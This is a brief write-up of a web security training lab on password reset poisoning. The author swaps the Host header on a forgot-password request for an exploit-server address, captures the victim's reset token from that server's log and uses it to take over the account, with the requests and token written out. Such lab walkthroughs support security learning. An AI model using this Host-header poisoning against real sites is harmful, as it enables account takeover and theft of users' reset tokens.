# Basic password reset poisoning

**Request:**
We can login using the credentials `wiener:peter`.

The goal is to gain access to the user `carlos` who will carelessly click on any links in emails that he receives.

**Solution:**
Using Burp Suite, on the website I clicked on the **forgot password** link, and gave the username as **carlos**.

```http
POST /forgot-password HTTP/2
Host: 0af2000e0441d0eb81caca2900a800a8.web-security-academy.net
...
```
I've sent this to the *Repeater* and went on to the *exploit server*, and copied the url, which I've put it on the Host.

```http
POST /forgot-password HTTP/2
Host: exploit-0ae5007d04ffd0b681a1c9a001e20037.exploit-server.net/exploit
...
```

After sending this request, on the logs of the exploit server, I received the request with the token and the full URL:

```http
GET /exploit/forgot-password?temp-forgot-password-token=als7iwktzwr7r8cct6m7ldrpmuxclyyj HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim)
...
```
Then I put this part of the URL, from `/forgot-password?...` and put it on the URL:

```
https://0af2000e0441d0eb81caca2900a800a8.web-security-academy.net/forgot-password?temp-forgot-password-token=als7iwktzwr7r8cct6m7ldrpmuxclyyj
```

Which prompted me to put the new password, and thus gained access.